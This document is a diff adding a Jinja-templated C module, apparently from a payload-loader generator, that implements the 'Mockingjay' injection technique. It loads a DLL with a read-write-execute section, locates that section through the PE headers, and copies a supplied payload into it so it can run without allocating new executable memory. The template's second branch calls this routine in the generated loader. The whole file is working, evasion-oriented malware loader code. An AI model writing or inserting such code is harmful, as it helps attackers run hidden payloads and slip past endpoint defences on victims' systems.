@@ -1,0 +1,70 @@
+{% from "macros.jinja" import function_typedef, function_definition, createThreadStub with context %}
+
+{% if section == "globals" %}
+    #include <psapi.h>
+    #include <dbghelp.h>
+    #pragma comment(lib, "dbghelp.lib")
+
+    DWORD_PTR FindRWXOffset(HMODULE hModule) {
+        IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
+        if (ntHeader != NULL) {
+            IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
+            for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
+                if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
+                    DWORD_PTR baseAddress = (DWORD_PTR)hModule;
+                    DWORD_PTR sectionOffset = sectionHeader->VirtualAddress;
+                    DWORD_PTR sectionSize = sectionHeader->SizeOfRawData;
+                    printf("[i] DLL base address: 0x%p\n", baseAddress);
+                    printf("\t[i] RWX section offset: 0x%p\n", sectionOffset);
+                    return sectionOffset;
+                }
+                sectionHeader++;
+            }
+        }
+        return 0;
+    }
+
+    DWORD_PTR FindRWXSize(HMODULE hModule) {
+        IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
+        if (ntHeader != NULL) {
+            IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
+            for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
+                if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
+                    DWORD_PTR sectionSize = sectionHeader->SizeOfRawData;
+                    printf("\t[i] RWX section size: %d bytes\n", sectionSize);
+                    return sectionSize;
+                }
+                sectionHeader++;
+            }
+        }
+        return 0;
+    }
+
+    void *MockingJay(LPCWSTR lib, void *payload, SIZE_T payload_length){
+        // Load the 'vulnerable' DLL
+        HMODULE hDll = LoadLibraryW(lib);
+
+        if (hDll == NULL) {
+            printf("[-] Failed to load the target DLL\n");
+            HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, payload);
+            return NULL;
+        }
+
+        MODULEINFO moduleInfo;
+        if (!GetModuleInformation(GetCurrentProcess(),hDll,&moduleInfo,sizeof(MODULEINFO))) {
+            printf("[-] Failed to get module info\n");
+            HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, payload);
+            return NULL;
+        }
+
+        DWORD_PTR RWX_SECTION_OFFSET = FindRWXOffset(hDll);
+        DWORD_PTR RWX_SECTION_SIZE = FindRWXSize(hDll);
+
+        // Access the RWX section (Vulnerable DLL address + offset)
+        LPVOID rwxSectionAddr = (LPVOID)((PBYTE)moduleInfo.lpBaseOfDll + RWX_SECTION_OFFSET);
+        memcpy(rwxSectionAddr, payload, payload_length);
+        return rwxSectionAddr;
+    }
+{% else %}
+    void *mem = MockingJay(L"{{ library }}", raw, length);
+{% endif %}
